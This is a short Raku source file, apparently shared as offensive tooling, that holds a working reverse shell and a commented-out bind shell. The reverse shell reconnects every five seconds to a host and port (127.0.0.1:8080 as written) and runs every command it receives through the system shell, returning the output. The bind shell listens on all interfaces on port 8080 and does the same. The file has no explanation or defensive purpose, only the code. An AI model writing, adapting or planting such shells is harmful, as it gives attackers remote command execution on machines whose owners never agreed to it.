# rakurs.raku

#[reverse shell]

loop {
   start {
      try {
         react {
            whenever IO::Socket::Async.connect('127.0.0.1', 8080) -> $conn {
               whenever $conn.Supply.lines -> $line {
                  my $out = shell $line, :out;
                  for $out.out.lines -> $oline {
                     $conn.say: $oline;
                  }
                  $out.out.close();
               }
            }
         }
      }
   }
   sleep 5;
}

#[bind shell]

#react {
#    whenever IO::Socket::Async.listen('0.0.0.0', 8080) -> $conn {
#        whenever $conn.Supply.lines -> $line {
#            my $out = shell $line, :out;
#            for $out.out.lines -> $oline {
#               $conn.say: $oline;
#            }
#            $out.out.close();
#        }
#    }
#}
